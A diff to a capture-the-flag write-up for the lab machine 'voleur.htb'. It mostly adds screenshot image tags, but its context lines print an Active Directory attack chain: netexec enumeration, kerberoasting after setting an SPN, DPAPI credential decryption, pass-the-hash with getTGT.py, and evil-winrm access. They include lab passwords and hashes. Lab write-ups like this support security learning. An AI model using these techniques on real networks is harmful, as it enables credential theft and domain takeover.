@@ -23,9 +23,10 @@ before check the auth:
 ```
 nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
 ```
-screen output
 
-
+<div align="center">
+  <img src="https://github.com/10T4/write-up/blob/main/images/voleur-ntlm.png" alt="d">
+</div>
 NTLM:False --> So we need a kerberos authentification, create your TGT ticket:
 ````
 kinit ryan.naylor@VOLEUR.HTB
@@ -87,7 +88,7 @@ svc_winrm Remote Management Need to ask Lacey as she reset this recently.
 Now go use bloodhound to make view of users
 
 <div align="center">
-  <img src="https://github.com/10T4/write-up/blob/main/images/Image15.png" alt="d">
+  <img src="https://github.com/10T4/write-up/blob/main/images/voleur-blood2.png" alt="d">
 </div>
 
 and we see that genericWrite is enable with the group Restore_Users@voleur.htb on Lacey.Miller and svc_winrm, so trying to set a new SPN on Lacey.Miller and use kerberoast attack to get the TGS:
@@ -109,6 +110,10 @@ and display the TGSs of all SPN user
 ````
 GetUserSPNs.py voleur.htb/svc_ldap -k -no-pass -dc-host DC.VOLEUR.HTB -request
 ````
+<div align="center">
+  <img src="https://github.com/10T4/write-up/blob/main/images/voleur-tgs-lacey.png" alt="d">
+</div>
+
 
 try to decode the hash of Lacey.Miller
 
@@ -182,6 +187,10 @@ Now Decrypt the aleatory key
 ```
 dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
 ```
+<div align="center">
+  <img src="https://github.com/10T4/write-up/blob/main/images/cred-jeremy.png" alt="d">
+</div>
+
 
 New credential found:
 jeremy.combs
@@ -210,3 +219,6 @@ getTGT.py voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc
  evil-winrm -i DC.voleur.htb -r voleur.htb
 
  ROOT FLAG
+ <div align="center">
+  <img src="https://github.com/10T4/write-up/blob/main/images/voleur-flag-root.png" alt="d">
+</div>
